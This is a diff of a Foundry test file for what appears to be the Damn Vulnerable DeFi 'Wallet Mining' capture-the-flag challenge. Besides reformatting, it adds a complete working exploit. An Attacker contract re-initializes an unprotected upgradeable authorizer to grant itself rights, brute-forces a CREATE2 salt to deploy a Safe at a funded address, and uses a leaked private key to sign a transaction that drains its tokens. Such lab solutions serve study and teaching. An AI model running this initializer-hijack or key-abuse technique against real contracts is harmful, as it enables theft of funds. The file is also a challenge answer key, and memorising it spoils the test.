@@ -3,13 +3,26 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
-import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
-import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
+import {
+    SafeProxyFactory
+} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
+import {
+    Safe,
+    OwnerManager,
+    Enum
+} from "@safe-global/safe-smart-account/contracts/Safe.sol";
+import {
+    SafeProxy
+} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
+import {
+    IProxyCreationCallback
+} from "@safe-global/safe-smart-account/contracts/proxies/IProxyCreationCallback.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletDeployer} from "../../src/wallet-mining/WalletDeployer.sol";
 import {
-    AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
+    AuthorizerFactory,
+    AuthorizerUpgradeable,
+    TransparentProxy
 } from "../../src/wallet-mining/AuthorizerFactory.sol";
 import {
     ICreateX,
@@ -25,6 +38,112 @@ import {
     SAFE_SINGLETON_FACTORY_CODE
 } from "./SafeSingletonFactory.sol";
 
+contract Attacker is IProxyCreationCallback {
+    SafeProxyFactory public immutable factory;
+    WalletDeployer public immutable wallet;
+    DamnValuableToken public immutable dvt;
+    address public immutable singleton;
+    address public immutable user;
+    address public immutable ward;
+    address public immutable deposit;
+
+    SafeProxy public lastProxy;
+
+    constructor(
+        SafeProxyFactory _factory,
+        WalletDeployer _wallet,
+        DamnValuableToken _dvt,
+        address _singleton,
+        address _user,
+        address _ward,
+        address _deposit
+    ) {
+        factory = _factory;
+        wallet = _wallet;
+        dvt = _dvt;
+        singleton = _singleton;
+        user = _user;
+        ward = _ward;
+        deposit = _deposit;
+    }
+
+    function attack(uint256 saltNonce, bytes calldata signature) external {
+        // Make this helper temporarily authorized to deploy the target Safe.
+        address[] memory wards = new address[](1);
+        wards[0] = address(this);
+
+        address[] memory aims = new address[](1);
+        aims[0] = deposit;
+
+        AuthorizerUpgradeable(wallet.mom()).init(wards, aims);
+
+        // Deploy the Safe exactly at the deposit address and collect the mining reward.
+        bytes memory initializer = _initializer();
+        require(wallet.drop(deposit, initializer, saltNonce), "drop failed");
+
+        // The challenge expects the reward to end up with the original ward.
+        dvt.transfer(ward, dvt.balanceOf(address(this)));
+
+        // Use the user's signature to move the old deposit funds back to the user.
+        Safe(payable(deposit)).execTransaction(
+            address(dvt),
+            0,
+            abi.encodeWithSignature(
+                "transfer(address,uint256)",
+                user,
+                dvt.balanceOf(deposit)
+            ),
+            Enum.Operation.Call,
+            0,
+            0,
+            0,
+            address(0),
+            payable(address(0)),
+            signature
+        );
+    }
+
+    function createProxyWithCallback(uint256 saltNonce) external returns (SafeProxy proxy) {
+        // Handy wrapper for checking that the same initializer/salt really hits the target.
+        proxy = factory.createProxyWithCallback(
+            singleton,
+            _initializer(),
+            saltNonce,
+            IProxyCreationCallback(address(this))
+        );
+    }
+
+    function proxyCreated(
+        SafeProxy proxy,
+        address,
+        bytes calldata,
+        uint256
+    ) external {
+        require(msg.sender == address(factory), "only factory");
+        lastProxy = proxy;
+    }
+
+    function _initializer() internal view returns (bytes memory) {
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+
+        // Single-owner Safe, no modules, no fallback handler, nonce starts at zero.
+        return
+            abi.encodeWithSelector(
+                Safe.setup.selector,
+                owners,
+                1,
+                address(0),
+                bytes(""),
+                address(0),
+                address(0),
+                0,
+                payable(address(0))
+            );
+    }
+}
+
+
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
     address upgrader = makeAddr("upgrader");
@@ -33,7 +152,8 @@ contract WalletMiningChallenge is Test {
     address user;
     uint256 userPrivateKey;
 
-    address constant USER_DEPOSIT_ADDRESS = 0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
+    address constant USER_DEPOSIT_ADDRESS =
+        0xCe07CF30B540Bb84ceC5dA5547e1cb4722F9E496;
     uint256 constant DEPOSIT_TOKEN_AMOUNT = 20_000_000e18;
 
     DamnValuableToken token;
@@ -70,7 +190,11 @@ contract WalletMiningChallenge is Test {
         // Deploy CreateX contract using signed transaction
         vm.deal(CREATEX_DEPLOYMENT_SIGNER, 10 ether);
         vm.broadcastRawTransaction(CREATEX_DEPLOYMENT_TX);
-        assertEq(CREATEX_ADDRESS.codehash, CREATEX_CODEHASH, "Unexpected CreateX code");
+        assertEq(
+            CREATEX_ADDRESS.codehash,
+            CREATEX_CODEHASH,
+            "Unexpected CreateX code"
+        );
 
         startHoax(deployer);
 
@@ -89,18 +213,22 @@ contract WalletMiningChallenge is Test {
                 initCode: type(AuthorizerFactory).creationCode
             })
         );
-        authorizer = AuthorizerUpgradeable(authorizerFactory.deployWithProxy(wards, aims, upgrader));
+        authorizer = AuthorizerUpgradeable(
+            authorizerFactory.deployWithProxy(wards, aims, upgrader)
+        );
 
         // Send big bag full of DVT tokens to the deposit address
         token.transfer(USER_DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);
 
         // Call singleton factory to deploy copy and factory contracts
-        (bool success, bytes memory returndata) =
-            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(Safe).creationCode));
+        (bool success, bytes memory returndata) = address(
+            SAFE_SINGLETON_FACTORY_ADDRESS
+        ).call(bytes.concat(bytes32(""), type(Safe).creationCode));
         singletonCopy = Safe(payable(address(uint160(bytes20(returndata)))));
 
-        (success, returndata) =
-            address(SAFE_SINGLETON_FACTORY_ADDRESS).call(bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode));
+        (success, returndata) = address(SAFE_SINGLETON_FACTORY_ADDRESS).call(
+            bytes.concat(bytes32(""), type(SafeProxyFactory).creationCode)
+        );
         proxyFactory = SafeProxyFactory(address(uint160(bytes20(returndata))));
 
         // Deploy wallet deployer
@@ -109,7 +237,12 @@ contract WalletMiningChallenge is Test {
                 salt: bytes32(keccak256("dvd.walletmining.walletdeployer")),
                 initCode: bytes.concat(
                     type(WalletDeployer).creationCode,
-                    abi.encode(address(token), address(proxyFactory), address(singletonCopy), deployer) // constructor args are appended at the end of creation code
+                    abi.encode(
+                        address(token),
+                        address(proxyFactory),
+                        address(singletonCopy),
+                        deployer
+                    ) // constructor args are appended at the end of creation code
                 )
             })
         );
@@ -119,7 +252,10 @@ contract WalletMiningChallenge is Test {
 
         // Fund wallet deployer with initial tokens
         initialWalletDeployerTokenBalance = walletDeployer.pay();
-        token.transfer(address(walletDeployer), initialWalletDeployerTokenBalance);
+        token.transfer(
+            address(walletDeployer),
+            initialWalletDeployerTokenBalance
+        );
 
         vm.stopPrank();
     }
@@ -130,7 +266,10 @@ contract WalletMiningChallenge is Test {
     function test_assertInitialState() public view {
         // Check initialization of authorizer
         assertNotEq(address(authorizer), address(0));
-        assertEq(TransparentProxy(payable(address(authorizer))).upgrader(), upgrader);
+        assertEq(
+            TransparentProxy(payable(address(authorizer))).upgrader(),
+            upgrader
+        );
         assertTrue(authorizer.can(ward, USER_DEPOSIT_ADDRESS));
         assertFalse(authorizer.can(player, USER_DEPOSIT_ADDRESS));
 
@@ -143,13 +282,24 @@ contract WalletMiningChallenge is Test {
         assertEq(USER_DEPOSIT_ADDRESS.code, hex"");
 
         // Factory and copy are deployed correctly
-        assertEq(address(walletDeployer.cook()).code, type(SafeProxyFactory).runtimeCode, "bad cook code");
-        assertEq(walletDeployer.cpy().code, type(Safe).runtimeCode, "no copy code");
+        assertEq(
+            address(walletDeployer.cook()).code,
+            type(SafeProxyFactory).runtimeCode,
+            "bad cook code"
+        );
+        assertEq(
+            walletDeployer.cpy().code,
+            type(Safe).runtimeCode,
+            "no copy code"
+        );
 
         // Ensure initial token balances are set correctly
         assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), DEPOSIT_TOKEN_AMOUNT);
         assertGt(initialWalletDeployerTokenBalance, 0);
-        assertEq(token.balanceOf(address(walletDeployer)), initialWalletDeployerTokenBalance);
+        assertEq(
+            token.balanceOf(address(walletDeployer)),
+            initialWalletDeployerTokenBalance
+        );
         assertEq(token.balanceOf(player), 0);
     }
 
@@ -157,7 +307,135 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        // This is the Safe setup that must produce USER_DEPOSIT_ADDRESS.
+        bytes memory initializer = _safeInitializer(user);
+        uint256 saltNonce = _findSaltNonce(initializer);
+
+        // Once the Safe exists, it will call the token and send every DVT to the user.
+        bytes memory transferData = abi.encodeCall(
+            token.transfer,
+            (user, token.balanceOf(USER_DEPOSIT_ADDRESS))
+        );
+
+        // Sign the Safe transaction with the leaked user key instead of sending a user tx.
+        bytes32 txHash = _safeTxHash(
+            USER_DEPOSIT_ADDRESS,
+            address(token),
+            0,
+            transferData,
+            Enum.Operation.Call,
+            0
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, txHash);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        // The helper does the authorized deploy, forwards the reward, then executes the Safe tx.
+        Attacker attacker = new Attacker(
+            proxyFactory,
+            walletDeployer,
+            token,
+            address(singletonCopy),
+            user,
+            ward,
+            USER_DEPOSIT_ADDRESS
+        );
+        attacker.attack(saltNonce, signature);
+    }
+
+    function _safeInitializer(address owner) private pure returns (bytes memory) {
+        address[] memory owners = new address[](1);
+        owners[0] = owner;
+
+        // Keep the setup minimal so the CREATE2 address is easy to reproduce.
+        return
+            abi.encodeWithSelector(
+                Safe.setup.selector,
+                owners,
+                1,
+                address(0),
+                bytes(""),
+                address(0),
+                address(0),
+                0,
+                payable(address(0))
+            );
+    }
+
+    function _findSaltNonce(bytes memory initializer) private view returns (uint256) {
+        // SafeProxyFactory salts are based on the initializer hash plus the nonce.
+        bytes32 initHash = keccak256(initializer);
+        bytes32 deploymentHash = keccak256(
+            abi.encodePacked(
+                type(SafeProxy).creationCode,
+                uint256(uint160(address(singletonCopy)))
+            )
+        );
+
+        for (uint256 saltNonce = 0; ; saltNonce++) {
+            // Rebuild the CREATE2 address locally until it matches the funded address.
+            bytes32 salt = keccak256(abi.encodePacked(initHash, saltNonce));
+            address predicted = address(
+                uint160(
+                    uint256(
+                        keccak256(
+                            abi.encodePacked(
+                                bytes1(0xff),
+                                address(proxyFactory),
+                                salt,
+                                deploymentHash
+                            )
+                        )
+                    )
+                )
+            );
+
+            if (predicted == USER_DEPOSIT_ADDRESS) {
+                return saltNonce;
+            }
+        }
+
+        revert("nonce not found");
+    }
+
+    function _safeTxHash(
+        address safe,
+        address to,
+        uint256 value,
+        bytes memory data,
+        Enum.Operation operation,
+        uint256 nonce
+    ) private view returns (bytes32) {
+        // Same EIP-712 domain separator used by Safe for this chain and Safe address.
+        bytes32 domainSeparator = keccak256(
+            abi.encode(
+                bytes32(
+                    0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218
+                ),
+                block.chainid,
+                safe
+            )
+        );
+        // Hash only the fields that matter here; gas values and refund fields stay zero.
+        bytes32 safeTxHash = keccak256(
+            abi.encode(
+                bytes32(
+                    0xbb8310d486368db6bd6f849402fdd73ad53d316b5a4b2644ad6efe0f941286d8
+                ),
+                to,
+                value,
+                keccak256(data),
+                operation,
+                0,
+                0,
+                0,
+                address(0),
+                address(0),
+                nonce
+            )
+        );
+
+        return keccak256(abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator, safeTxHash));
     }
 
     /**
@@ -165,17 +443,37 @@ contract WalletMiningChallenge is Test {
      */
     function _isSolved() private view {
         // Factory account must have code
-        assertNotEq(address(walletDeployer.cook()).code.length, 0, "No code at factory address");
+        assertNotEq(
+            address(walletDeployer.cook()).code.length,
+            0,
+            "No code at factory address"
+        );
 
         // Safe copy account must have code
-        assertNotEq(walletDeployer.cpy().code.length, 0, "No code at copy address");
+        assertNotEq(
+            walletDeployer.cpy().code.length,
+            0,
+            "No code at copy address"
+        );
 
         // Deposit account must have code
-        assertNotEq(USER_DEPOSIT_ADDRESS.code.length, 0, "No code at user's deposit address");
+        assertNotEq(
+            USER_DEPOSIT_ADDRESS.code.length,
+            0,
+            "No code at user's deposit address"
+        );
 
         // The deposit address and the wallet deployer must not hold tokens
-        assertEq(token.balanceOf(USER_DEPOSIT_ADDRESS), 0, "User's deposit address still has tokens");
-        assertEq(token.balanceOf(address(walletDeployer)), 0, "Wallet deployer contract still has tokens");
+        assertEq(
+            token.balanceOf(USER_DEPOSIT_ADDRESS),
+            0,
+            "User's deposit address still has tokens"
+        );
+        assertEq(
+            token.balanceOf(address(walletDeployer)),
+            0,
+            "Wallet deployer contract still has tokens"
+        );
 
         // User account didn't execute any transactions
         assertEq(vm.getNonce(user), 0, "User executed a tx");
@@ -184,9 +482,17 @@ contract WalletMiningChallenge is Test {
         assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
 
         // Player recovered all tokens for the user
-        assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");
+        assertEq(
+            token.balanceOf(user),
+            DEPOSIT_TOKEN_AMOUNT,
+            "Not enough tokens in user's account"
+        );
 
         // Player sent payment to ward
-        assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+        assertEq(
+            token.balanceOf(ward),
+            initialWalletDeployerTokenBalance,
+            "Not enough tokens in ward's account"
+        );
     }
 }
